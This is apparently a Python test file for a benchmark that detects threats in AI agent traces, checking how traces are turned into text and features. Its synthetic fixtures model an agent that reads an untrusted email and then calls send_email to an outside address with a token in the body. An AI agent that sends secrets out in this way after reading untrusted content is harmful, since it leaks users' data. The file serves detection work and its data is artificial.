from agent_threat_detection.benchmark.features import structured_features, trace_to_text


def test_trace_text_preserves_source_tool_and_arguments():
    record = {
        "events": [
            {"kind": "document", "source": "email", "trust": "untrusted", "content": "review"},
            {"kind": "tool_call", "tool": "send_email", "arguments": {"to": "x@example.net"}},
        ]
    }

    text = trace_to_text(record)

    assert "source=email" in text
    assert "trust=untrusted" in text
    assert "tool=send_email" in text
    assert "x@example.net" in text


def test_structured_features_capture_security_relevant_shape():
    record = {
        "scenario": "email",
        "events": [
            {"kind": "document", "source": "email", "trust": "untrusted", "content": "review"},
            {
                "kind": "tool_call",
                "tool": "send_email",
                "arguments": {"to": "x@outside.example", "body": "token=synthetic"},
            },
        ],
    }

    features = structured_features(record)

    assert features["scenario=email"] == 1.0
    assert features["tool=send_email"] == 1.0
    assert features["has_untrusted_content"] == 1.0
    assert features["has_external_recipient"] == 1.0
    assert features["tool_call_count"] == 1.0
